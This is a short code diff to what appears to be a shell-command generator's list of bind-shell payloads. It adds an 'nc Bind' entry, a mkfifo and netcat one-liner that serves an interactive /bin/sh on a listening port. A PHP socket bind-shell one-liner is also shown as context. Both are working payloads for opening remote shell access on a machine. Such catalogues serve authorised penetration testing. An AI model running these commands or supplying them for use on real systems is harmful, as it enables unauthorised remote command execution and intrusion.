@@ -382,7 +382,12 @@ const bindShellCommands =  withCommandType(
             "name": "PHP Bind",
             "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
             "meta": ["bind", "mac", "linux", "windows"]
-        }
+        },
+        {
+            "name": "nc Bind",
+            "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
+            "meta": ["bind", "mac", "linux"]
+        },
     ]
 );
 
